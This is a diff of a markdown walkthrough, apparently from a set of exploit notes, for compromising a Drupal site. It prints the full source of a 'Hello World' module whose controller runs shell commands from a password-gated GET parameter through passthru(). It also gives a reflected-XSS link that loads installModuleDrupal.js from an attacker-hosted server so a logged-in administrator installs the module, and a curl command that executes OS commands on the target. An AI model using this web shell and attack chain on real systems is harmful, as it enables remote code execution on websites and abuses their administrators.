@@ -10,82 +10,98 @@
 
 ## Exploitation Steps
 
-1. [create Drupal module containing PHP payload] backdoor source code
+1. [create backdoored CMS module] backdoor source code
 
-(`hello_world.info.yml`)
+    * **NOTE**: update/customize PHP backdoor in `HelloWorldController.php`
 
-```
-name: hello_world
-type: module
-description: 'Hello World custom module'
-package: custom
-version: 1.0
-core_version_requirement: ^10
-```
+    (`hello_world.info.yml`)
 
-(`hello_world.routing.yml`)
+    ```
+    name: hello_world
+    type: module
+    description: 'Hello World custom module'
+    package: custom
+    version: 1.0
+    core_version_requirement: ^10
+    ```
 
-```
-hello_world.hellomsg:
-  path: '/hello-world'
-  defaults:
-    _controller: 'Drupal\hello_world\Controller\HelloWorldController::message'
-    _title: 'Hello World!!'
-  requirements:
-    _permission: 'access content'
-```
+    (`hello_world.routing.yml`)
 
-(`src/Controller/HelloWorldController.php`)
+    ```
+    hello_world.hellomsg:
+      path: '/hello-world'
+      defaults:
+        _controller: 'Drupal\hello_world\Controller\HelloWorldController::message'
+        _title: 'Hello World!!'
+      requirements:
+        _permission: 'access content'
+    ```
 
-```
-<?php
+    (`src/Controller/HelloWorldController.php`)
 
-namespace Drupal\hello_world\Controller;
+    ```
+    <?php
 
-class HelloWorldController {
-  public function message() {
-    if (md5($_GET['pass']) === '098f6bcd4621d373cade4e832627b4f6') { echo passthru($_GET['cmd']); }
-    return [
-      '#markup' => 'Hello World message from custom module'
-    ];
-  }
-}
-```
+    namespace Drupal\hello_world\Controller;
 
-2. [create Drupal module containing PHP payload] create Drupal module
+    class HelloWorldController {
+      public function message() {
+        if (md5($_GET['pass']) === '098f6bcd4621d373cade4e832627b4f6') { echo passthru($_GET['cmd']); }
+        return [
+          '#markup' => 'Hello World message from custom module'
+        ];
+      }
+    }
+    ```
 
-```
-tar cvf hello_world.tar.gz *
-```
+2. [create backdoored CMS module] create Drupal module
 
-3. victim user (with administrative privileges) logs in
+    ```
+    tar cvf hello_world.tar.gz *
+    ```
 
-http://192.168.5.17/user/login
+3. [setup exploit] change payload variable values (`installModuleDrupal.js`)
 
-4. victim user clicks link
+    `exploitURL` - URL of Drupal module (containing backdoor) to be installed on target site
 
-```
-http://192.168.5.17/test/rxss.php?q=<script src=http://192.168.5.13/installModuleDrupal.js></script>
-```
+    `drupalRoot` - path to Drupal installation on the target system (e.g. `"/path"`)
 
-5. execute OS command
+4. [setup exploit] setup web server (to serve the payload/module
 
-```
-curl -s "http://192.168.5.17/hello-world?pass=test&cmd=id" | head -n 1
-```
+5. [social engineering attack] victim user (with administrative privileges) logs in
 
-6. [optional] uninstall module - uninstall module via GUI
+    http://192.168.5.17/user/login
 
-*Drupal ➔ Extend ➔ [tab] Uninstall ➔ (filter by name) hello ➔ (mark checkbox) Hello World ➔ Uninstall ➔ Uninstall*
+6. [social engineering attack] victim user clicks link
 
-7. [optional] uninstall module - remove module from filesystem
+    ```
+    http://192.168.5.17/test/rxss.php?q=<script src=http://192.168.5.13/installModuleDrupal.js></script>
+    ```
 
-```
-sudo su
-cd /var/www/html/drupal/modules
-rm -rf hello_world
-```
+    * **NOTES**:
+      * `192.168.5.17` - target Drupal site
+      * `192.168.5.13` - web server hosting payload
+
+7. [post exploit] execute OS command
+
+    ```
+    curl -s "http://192.168.5.17/hello-world?pass=test&cmd=id" | head -n 1
+    ```
+
+8. [uninstall module] uninstall module via GUI
+
+    *Drupal ➔ Extend ➔ [tab] Uninstall ➔ (filter by name) hello ➔ (mark checkbox) Hello World ➔ Uninstall ➔ Uninstall*
+
+9. [uninstall module] remove module from filesystem
+
+    ```
+    sudo su
+    cd /var/www/html/drupal/modules
+    rm -rf hello_world
+    ```
 
 ## Screenshots
+
+* **NOTE**: the screenshot covers steps 1 to 7 from the "Exploitation Steps" chapter
 
 ![Image](screenshots/Drupal_-_install_module_-_1-1.png)
